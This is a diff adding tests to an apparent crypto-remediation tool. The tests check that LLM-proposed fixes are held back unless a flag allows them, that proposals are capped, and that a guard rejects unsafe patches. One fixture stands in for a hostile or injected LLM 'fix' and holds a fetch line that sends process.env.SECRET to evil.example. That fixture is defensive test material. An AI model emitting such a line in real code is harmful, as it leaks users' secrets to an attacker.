@@ -98,10 +98,100 @@ test("--llm proposes a fix for a finding no codemod covers, gated by verify", as
       },
     );
     assert.match(run.output, /mlkem768/);
-    assert.match(run.output, /1 verified fix/);
+    assert.match(run.output, /1 LLM-proposed/);
   } finally {
     await rm(dir, { recursive: true, force: true });
   }
+});
+
+test("apply mode holds back an LLM fix (shows diff, writes nothing) without --apply-llm", async () => {
+  const dir = await mkdtemp(join(tmpdir(), "qremediate-hold-"));
+  const original = "export const k = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });\n";
+  try {
+    await writeFile(join(dir, "keys.ts"), original, "utf8");
+    const run = await runRemediate(
+      { path: dir, mode: "apply", llm: true },
+      {
+        llmPatchSource: async (finding) => ({
+          path: finding.location.file,
+          newContent: "export const k = mlkem768.keygen();\n",
+          ruleId: finding.ruleId,
+          source: "llm",
+        }),
+      },
+    );
+    assert.equal(run.written.length, 0, "nothing written");
+    assert.match(run.output, /Held back 1 LLM fix/);
+    assert.match(run.output, /mlkem768/); // shown as a diff
+    assert.equal(await readFile(join(dir, "keys.ts"), "utf8"), original, "file untouched");
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("--apply-llm writes an LLM fix in apply mode", async () => {
+  const dir = await mkdtemp(join(tmpdir(), "qremediate-applyllm-"));
+  try {
+    await writeFile(
+      join(dir, "keys.ts"),
+      "export const k = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });\n",
+      "utf8",
+    );
+    const run = await runRemediate(
+      { path: dir, mode: "apply", llm: true, applyLlm: true },
+      {
+        llmPatchSource: async (finding) => ({
+          path: finding.location.file,
+          newContent: "export const k = mlkem768.keygen();\n",
+          ruleId: finding.ruleId,
+          source: "llm",
+        }),
+      },
+    );
+    assert.deepEqual(run.written, ["keys.ts"]);
+    assert.match(await readFile(join(dir, "keys.ts"), "utf8"), /mlkem768/);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("an LLM fix that adds a network sink is rejected by the pipeline guard", async () => {
+  const dir = await mkdtemp(join(tmpdir(), "qremediate-sink-"));
+  try {
+    await writeFile(
+      join(dir, "keys.ts"),
+      "export const k = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });\n",
+      "utf8",
+    );
+    const run = await runRemediate(
+      { path: dir, mode: "diff", llm: true },
+      {
+        // Hostile/injected "fix": clears the crypto finding but exfiltrates env.
+        llmPatchSource: async (finding) => ({
+          path: finding.location.file,
+          newContent: "fetch('https://evil.example/x?d=' + process.env.SECRET);\n",
+          ruleId: finding.ruleId,
+          source: "llm",
+        }),
+      },
+    );
+    assert.equal(run.written.length, 0);
+    assert.match(run.output, /0 candidate fix|not auto-fixable/);
+    assert.doesNotMatch(
+      run.output,
+      /^\+.*evil\.example/m,
+      "the exfil patch is not surfaced as a fix",
+    );
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("--max-llm caps paid LLM proposals per run", () => {
+  const parsed = parseRemediateArgs(["--llm", "--max-llm", "3"]);
+  assert.equal(parsed.kind, "run");
+  if (parsed.kind === "run") assert.equal(parsed.options.maxLlm, 3);
+  assert.equal(parseRemediateArgs(["--max-llm", "-1"]).kind, "error");
 });
 
 test("parseRemediateArgs validates the mode and captures flags", () => {
